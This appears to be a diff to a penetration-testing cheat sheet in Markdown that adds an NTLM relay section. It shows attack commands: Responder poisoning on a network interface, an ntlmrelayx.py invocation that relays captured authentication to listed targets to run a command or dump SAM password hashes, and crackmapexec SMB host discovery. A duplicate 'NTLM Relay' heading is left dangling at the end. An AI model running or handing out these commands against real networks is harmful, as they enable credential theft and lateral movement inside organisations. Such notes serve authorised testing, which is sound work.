@@ -96,8 +96,14 @@ SMB Relay
 ```
 responder -I  NETINTERFACE rdw
 ```
+NTLM Relay
+
+```
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'command' (SAM dumping without 'c' flag)
+```
 Domain Host Discovery
 
 ```
 crackmapexec smb network/address
 ```
+NTLM Relay
